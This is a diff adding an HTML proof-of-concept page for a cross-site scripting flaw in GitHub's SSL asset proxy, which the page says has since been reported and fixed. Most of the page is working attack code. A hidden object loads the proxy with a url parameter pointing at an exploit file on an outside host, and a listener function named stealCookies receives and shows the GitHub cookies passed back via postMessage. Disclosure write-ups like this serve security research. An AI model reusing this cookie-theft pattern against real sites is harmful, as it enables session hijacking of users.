@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>GitHub SSL asset proxy XSS PoC</title>
+<meta charset="utf-8"/>
+<style type="text/css">
+#exploit {
+	visibility: hidden;
+	width: 0;
+	height: 0;
+}
+#cookies {
+	word-wrap: break-word;
+	text-wrap: unrestricted;
+}
+</style>
+</head>
+<body>
+<h1>GitHub SSL asset proxy XSS <dfn title="proof of concept">PoC</dfn></h1>
+<p><em>This has since been reported to and fixed by GitHub</em></p>
+<pre id="cookies">Loading exploit...</pre>
+<script type="application/javascript">
+var stealCookies = function (evt) {
+	self.removeEventListener(evt.type, stealCookies, false);
+	if (evt.origin === "https://assets1.github.com") {
+		var out = document.getElementById("cookies");
+		out.firstChild.data = "Stolen cookies: " + evt.data;
+	}
+};
+self.addEventListener("message", stealCookies, false);
+</script>
+<object id="exploit" data="https://assets1.github.com/img/2473576cdad5aafd8f1e70cda9e8b1b62673c5ad?repo=&amp;url=http%3A%2F%2Fcode.eligrey.com%2Fsec%2Fsites%2Fgithub%2Fexploit.xhtml&amp;path="></object>
+<script type="application/javascript">
+var _gaq = _gaq || [];
+_gaq.push(['_setAccount', 'UA-4364432-7']);
+_gaq.push(['_trackPageview']);
+(function() {
+	var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+	ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+	var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+})();
+</script>
+</body>
+</html>
